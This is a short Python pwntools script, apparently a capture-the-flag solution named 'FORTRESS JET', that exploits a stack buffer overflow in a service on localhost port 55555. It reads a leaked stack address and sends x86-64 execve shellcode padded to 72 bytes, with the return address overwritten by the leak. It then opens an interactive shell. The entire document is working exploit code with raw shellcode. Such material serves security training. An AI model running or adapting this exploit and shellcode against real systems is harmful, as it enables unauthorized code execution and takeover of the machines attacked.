#!/usr/bin/env python3
# FORTRESS JET

from pwn import *

context.log_level = 'debug'

# CONNECT
s = connect('127.0.0.1',55555)

# EXTRACTING LEAK ADD 
s.recvuntil("Oops, I'm leaking! ")
leak = int(s.recvuntil('\n'),16)
log.info(f'Leaked Addrress: {hex(leak)}')

# PAYLOAD
shellcode=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload = b"A"*(72-len(shellcode))

# TEXT
s.recvuntil('> ')

# EIP CONTROL
payload = shellcode + payload + p64(leak)
#print(payload)
s.sendline(payload)
s.interactive()
